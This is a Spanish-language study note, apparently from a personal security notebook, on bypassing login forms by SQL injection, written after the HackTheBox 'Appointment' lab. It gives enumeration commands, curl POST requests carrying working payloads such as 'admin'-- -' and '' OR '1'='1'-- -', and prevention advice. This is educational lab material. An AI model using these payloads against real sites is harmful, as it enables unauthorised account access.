---
tags:
  - tecnica
  - categoria/initial-access
  - categoria/credential-access
  - os/linux
  - os/windows
  - nivel/basico
fecha_aprendida: 2026-08-10
fuente: HTB/Appointment
mitre_technique: T1190
---
# ⚔️ SQL Injection — Login Bypass

> [!abstract] Resumen
> Bypass de autenticación inyectando sintaxis SQL en un campo de login cuya query se construye por concatenación de strings sin sanitización. No requiere conocer credenciales válidas.

---

## ¿Qué es y por qué funciona?

Cuando el backend arma la query concatenando directamente el input (`"SELECT * FROM users WHERE user='".$_POST['user']."'"`), el atacante puede cerrar la comilla del campo e inyectar su propia lógica SQL. Usando el comentador del motor (`--` en ANSI/MSSQL, `#` en MySQL), todo lo que sigue en la query original — incluida la validación de password — queda comentado y se ignora. El motor ejecuta una query sintácticamente válida que siempre autentica.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - La query se construye por concatenación de strings, sin prepared statements/parametrized queries
> - No hay WAF filtrando caracteres SQL (`'`, `--`, `#`, `OR`) en el parámetro
> - No hay sanitización de input a nivel de aplicación

---

## Procedimiento

### Detección / Enumeración

```bash
# Mapear la app antes de inyectar
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html

# Inspeccionar el formulario de login
curl -s http://<IP>/login.php | grep -A 20 '<form'
# → identificar name= de los campos (username, password) y method (GET/POST)
```

### Explotación

```bash
# Paso 1: probar comentador ANSI (funciona en MySQL con espacio: '-- -)
curl -s -X POST http://<IP>/login.php -d "username=admin'-- -&password=x" -L

# Paso 2: si falla, probar sin username conocido
curl -s -X POST http://<IP>/login.php -d "username=' OR '1'='1'-- -&password=x" -L

# Paso 3: probar comentador MySQL nativo
curl -s -X POST http://<IP>/login.php -d "username=admin'#&password=x" -L

# Paso 4: confirmar bypass — buscar redirección, cambio de contenido, o flag directa
```

> [!tip] Variaciones comunes
> - MySQL exige espacio después de `--`: usar `-- -` (guión final actúa como contenido del comentario, no como parte de la sintaxis)
> - Si `--` no funciona, probar `#` (MySQL) — indica que el motor es MySQL/MariaDB
> - `' OR 1=1#` cuando no se conoce ningún username válido
> - Con Burp Suite: interceptar POST → Repeater → iterar payloads sin reescribir curl cada vez

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| curl | Pruebas manuales rápidas de payloads | `curl -X POST <url> -d "campo=payload"` |
| Burp Suite | Interceptar/iterar requests sin CLI | Proxy → Repeater |
| sqlmap | Automatización de detección/explotación SQLi | `sqlmap -u <url> --data="user=x&pass=y"` (siguiente nivel, ver Vaccine) |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> Prepared statements / parametrized queries (PDO `prepare()`+`execute()`, MySQLi `bind_param()`) — separan código SQL de datos, el motor nunca interpreta el input como sintaxis. WAF con OWASP Core Rule Set como capa adicional. Nunca mostrar errores SQL crudos al cliente. Rate limiting en endpoints de login.

---

## Dónde la usé

- `[[HTB/Appointment/Appointment]]` — Bypass con `admin'-- -`, flag obtenida directamente del response post-login

---

## Referencias

- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [MITRE ATT&CK - T1190](https://attack.mitre.org/techniques/T1190/)
